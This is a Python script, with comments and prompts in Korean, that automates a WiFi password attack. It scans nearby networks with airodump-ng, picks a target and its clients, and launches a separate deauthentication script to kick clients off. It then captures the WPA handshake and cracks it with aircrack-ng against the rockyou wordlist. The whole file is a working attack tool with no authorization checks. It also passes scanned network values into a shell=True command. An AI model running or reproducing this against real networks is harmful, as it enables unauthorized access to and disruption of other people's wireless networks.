import subprocess
import re
import csv
import time
import os

# 네트워크 인터페이스 목록 가져오기
def get_network_interfaces():
    cmd_result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    interfaces = re.findall(r'\d+: ([^:]+):', cmd_result.stdout)
    return interfaces

# CSV 파일에서 BSSID, ESSID, 채널 정보 추출
def parse_airodump_csv(csv_filename):
    networks = []
    try:
        with open(csv_filename, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) > 0 and row[0].strip().upper() == 'BSSID':
                    next(reader)
                    for network_row in reader:
                        if len(network_row) < 2:
                            break
                        bssid = network_row[0].strip()
                        essid = network_row[13].strip()
                        channel = network_row[3].strip()
                        networks.append((bssid, essid, channel))
                        print(f"[{len(networks)}] {bssid}       {essid}       C: {channel}")
    except FileNotFoundError:
        print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다.")
    return networks

# 클라이언트 정보 추출
def parse_clients_csv(csv_filename):
    clients = []
    try:
        with open(csv_filename, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) > 0 and row[0].strip().upper() == 'STATION':
                    next(reader)
                    for client_row in reader:
                        if len(client_row) < 2:
                            break
                        station = client_row[0].strip()
                        clients.append(station)
                        print(f"클라이언트: {station}")
    except FileNotFoundError:
        print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다.")
    return clients

# 핸드셰이크 캡처
def capture_handshake(interface, bssid, channel):
    output_dir = 'output_files'
    os.makedirs(output_dir, exist_ok=True)
    airodump_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", f"{output_dir}/handshake", interface]
    airodump_process = subprocess.Popen(airodump_cmd)
    
    return airodump_process

# 비밀번호 크랙
def crack_password(handshake_file, wordlist):
    if not os.path.isfile(wordlist):
        print(f"워드리스트 파일 '{wordlist}'을 찾을 수 없습니다.")
        return

    aircrack_cmd = ["sudo", "aircrack-ng", "-w", wordlist, handshake_file]
    subprocess.run(aircrack_cmd)

def main():
    interfaces = get_network_interfaces()
    for index, interface in enumerate(interfaces, start=1):
        print(f"[{index}] {interface}")
    
    choice = input("선택할 네트워크 번호 또는 BSSID 입력: ")
    if choice.isdigit():
        selected_interface = interfaces[int(choice)-1]
    else:
        selected_interface = choice

    output_dir = 'output_files'
    os.makedirs(output_dir, exist_ok=True)
    csv_filename_prefix = f"{output_dir}/output"
    csv_filename = f"{csv_filename_prefix}-01.csv"

    print(f"airodump-ng를 실행합니다. 인터페이스: {selected_interface}")
    airodump_cmd = ["sudo", "airodump-ng", selected_interface, "--write", csv_filename_prefix, "--output-format", "csv"]
    airodump_process = subprocess.Popen(airodump_cmd)

    print("airodump-ng가 데이터를 수집 중입니다. 10초 후에 결과를 분석합니다...")
    time.sleep(10)

    airodump_process.terminate()
    try:
        airodump_process.wait(timeout=10)
    except subprocess.TimeoutExpired:
        print("airodump-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
        airodump_process.kill()

    print("airodump-ng 데이터 수집을 종료하고 결과를 분석합니다.")
    
    networks = parse_airodump_csv(csv_filename)
    choice = input("선택할 네트워크 번호 또는 BSSID 입력: ")
    selected_network = None

    if choice.isdigit():
        selected_network = networks[int(choice) - 1]
    else:
        for network in networks:
            if network[0] == choice:
                selected_network = network
                break

    if selected_network:
        bssid, essid, channel = selected_network
        print(f"선택한 네트워크: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
        
        clients = parse_clients_csv(csv_filename)

        # 디어소시에이션 공격을 위한 별도 스크립트 실행
        deauth_script = f"gnome-terminal -- bash -c 'python3 deauth_attack.py {bssid} {selected_interface} {' '.join(clients)}; exec bash'"
        subprocess.Popen(deauth_script, shell=True)

        airodump_process = capture_handshake(selected_interface, bssid, channel)

        print("핸드셰이크를 캡처 중입니다. 60초 동안 기다립니다...")
        time.sleep(60)

        # airodump-ng 프로세스 종료
        airodump_process.terminate()
        try:
            airodump_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            print("airodump-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
            airodump_process.kill()

        handshake_file = f"{output_dir}/handshake-01.cap"
        wordlist = "/usr/share/wordlists/rockyou.txt"
        crack_password(handshake_file, wordlist)
    else:
        print("잘못된 선택입니다.")

if __name__ == "__main__":
    main()
